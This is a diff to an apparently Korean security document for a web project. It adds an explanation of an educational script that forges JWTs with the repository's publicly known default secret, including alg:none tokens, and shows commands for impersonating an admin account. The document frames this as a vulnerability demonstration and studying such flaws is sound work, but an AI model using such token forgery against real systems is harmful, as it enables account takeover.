@@ -75,6 +75,38 @@ curl -s -w "\n%{http_code}\n" "$B/api/userinfos/me" -H "Authorization: Bearer $F
 
 → **비밀번호를 몰라도 secret 하나로 관리자 세션을 얻는다.** (roles 는 DB에서 오므로, admin 계정명으로 위조하면 admin 권한을 그대로 획득)
 
+#### `jwt_forge.py` 는 무엇을 하나 (교육용 위조 스크립트)
+
+외부 라이브러리 없이 **표준 라이브러리만으로** JWT 를 직접 서명(위조)한다. 핵심은 "서버와 똑같은 방식으로 서명 키를 만드는 것"이다.
+
+```python
+# 서버의 jwt.secret 과 동일한 문자열. 서버가 secret.getBytes() 로 키를 만들므로
+# 여기서도 이 "문자열의 UTF-8 바이트" 를 HMAC 키로 쓴다 → 서명이 일치한다.
+SECRET = "5367566B...7437"
+
+def forge(sub, ttl=3600, alg="HS256"):
+    header  = {"alg": alg}                               # 예: {"alg":"HS256"}
+    payload = {"sub": sub, "iat": now, "exp": now+ttl}   # sub 에 원하는 사용자(예: admin@aa.com)
+    signing_input = b64url(header) + "." + b64url(payload)
+    if alg == "none":
+        return signing_input + "."                       # 서명 없는 토큰(alg:none 데모)
+    sig = hmac_sha256(SECRET, signing_input)             # 알려진 secret 으로 서명
+    return signing_input + "." + b64url(sig)             # header.payload.signature
+```
+
+**동작 단계**
+1. `header`·`payload`(JSON)를 각각 **base64url** 로 인코딩해 `.` 으로 잇는다 → `signing_input`
+2. `signing_input` 을 **알려진 secret 으로 HMAC-SHA256 서명** → 세 번째 칸(signature)
+3. `header.payload.signature` 를 출력 → 서버는 같은 secret 으로 검증하므로 **유효한 토큰으로 인정**
+
+**사용법**
+```bash
+python docs/security/jwt_forge.py                 # 기본: sub=admin@aa.com, alg=HS256
+python docs/security/jwt_forge.py user@aa.com     # 다른 사용자로 위조
+python docs/security/jwt_forge.py admin@aa.com none  # alg:none 토큰(3-2 데모)
+```
+> 핵심 포인트: **위조가 가능한 이유는 secret 이 공개됐기 때문**이다. secret 이 강하고 비공개면 이 스크립트의 서명이 서버 키와 달라 **401** 이 된다(4-1 안전 버전에서 확인). 이 스크립트는 **교육용**이며 이 저장소의 공개 기본 secret 에만 맞춰져 있다.
+
 ### 3-2. alg:none · 서명 변조 → 이미 차단됨
 
 고전적 JWT 공격들을 시도해도 `verifyWith` 가 막는다(검증됨):
